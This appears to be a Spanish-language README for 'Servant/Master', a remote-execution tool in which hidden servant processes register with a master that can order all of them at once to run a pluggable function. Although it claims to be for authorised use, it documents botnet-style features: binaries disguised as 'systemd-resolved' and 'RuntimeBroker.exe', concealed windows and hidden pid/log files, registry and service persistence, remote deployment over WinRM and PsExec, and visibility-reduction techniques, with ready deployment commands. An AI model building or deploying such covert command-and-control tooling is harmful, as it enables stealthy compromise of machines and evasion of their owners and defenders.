# Servant / Master — Sistema de Ejecución Remota Multiplataforma

## Resumen
Sistema de ejecución remota de tareas para entornos autorizados (simulaciones de seguridad, administración institucional).

### Componentes
- **`servant.py`**: Servidor que espera comandos autenticados en TCP. Al recibir `action: "run"` spawn N hilos que llaman a `bodrio(index)`.
  - Soporta Linux y Windows
  - Modo daemon (Linux) o ventana oculta (Windows)
  - Camuflaje de nombre de proceso
  - Logging configurable

- **`master.py`**: Cliente de control con CLI que permite:
  - `serve`: Ejecutar servidor de registro (recibe anuncios UDP de servants)
  - `list`: Listar servants conectados
  - `send`: Enviar comando a un servant específico
  - `send-all`: Enviar comando a todos los servants registrados

### Soporte Multiplataforma
✅ **Linux/Unix**: Modo daemon con fork, nombres de proceso camuflados
✅ **Windows**: Ventana oculta, servicio de Windows, tarea programada, registry persistence

## Diseño de Seguridad
- Por defecto usa `127.0.0.1` (localhost) para comunicación local segura
- Token precompartido para autenticación (`--token`)
- Anuncios periódicos de servants al master vía UDP
- Registro centralizado de servants activos en JSON
- **IMPORTANTE**: Diseñado para uso en entornos autorizados únicamente

## Archivos Principales
- `servant.py`: Servidor principal
- `master.py`: Cliente de control
- `requirements.txt`: Dependencias Python
- `DEPLOYMENT.md`: Guía completa de despliegue (Linux y Windows)

### Scripts de Compilación
- `build.sh`: Compilar binario para Linux
- `build_windows.bat`: Compilar binario para Windows

### Scripts de Despliegue
- `deploy_windows.bat`: Despliegue local en Windows
- `deploy_windows_remote.py`: Despliegue remoto en Windows vía WinRM
- `install_windows_service.py`: Instalar como servicio de Windows

## Función bodrio()
La función `bodrio(index: int)` está dejada como stub para que implementes tu lógica.
Cada hilo recibe un índice único (0..N-1).

## Inicio Rápido

### 1. Compilar binarios
**Linux:**
```bash
./build.sh
```

**Windows:**
```cmd
build_windows.bat
```

### 2. Iniciar Master (servidor de registro)
```bash
python3 master.py serve --listen-host 0.0.0.0 --listen-port 65433
```

### 3. Desplegar Servants

**Linux - Modo daemon:**
```bash
./dist/systemd-resolved --daemon --silent --token my-token --master-host 192.168.1.100 --master-port 65433
```

**Windows - Modo oculto:**
```cmd
RuntimeBroker.exe --hide-window --silent --token my-token --master-host 192.168.1.100 --master-port 65433
```

### 4. Listar servants conectados
```bash
python3 master.py list
```

### 5. Enviar comando a todos los servants
```bash
python3 master.py send-all --token my-token --action run --count 100
```

## Opciones de Despliegue Avanzado

### Linux: Daemon silencioso
```bash
./dist/systemd-resolved \
    --daemon \
    --silent \
    --token my-secret-token \
    --pidfile /var/tmp/.srv.pid \
    --logfile /var/tmp/.srv.log \
    --process-name systemd-resolved \
    --master-host 192.168.1.100 \
    --master-port 65433
```

### Windows: Completamente oculto
```cmd
RuntimeBroker.exe ^
    --hide-window ^
    --silent ^
    --token my-secret-token ^
    --pidfile C:\Windows\Temp\.srv.pid ^
    --logfile C:\Windows\Temp\.srv.log ^
    --process-name RuntimeBroker ^
    --master-host 192.168.1.100 ^
    --master-port 65433
```

### Windows: Como servicio (persistente)
```cmd
python install_windows_service.py install
net start ServantService
```

## Documentación Completa
Ver `DEPLOYMENT.md` para:
- Instrucciones detalladas de compilación
- Despliegue remoto (SSH, WinRM, PsExec)
- Persistencia (cron, tareas programadas, servicios)
- Gestión y troubleshooting
- Técnicas de reducción de visibilidad
- Limpieza y desinstalación

## Implementación de bodrio()
Edita la función en `servant.py`:
```python
def bodrio(index: int) -> None:
    """Implementa tu lógica aquí.
    
    Args:
        index: Número de hilo (0..N-1)
    """
    # Tu código aquí
    pass
```

## Notas de Seguridad
⚠️ **Este sistema está diseñado para uso en entornos autorizados únicamente**
- Obtén autorización por escrito antes de desplegar
- Documenta todos los despliegues
- Usa tokens fuertes (>32 caracteres aleatorios)
- Limpia al terminar la operación autorizada
- Respeta las políticas de la institución
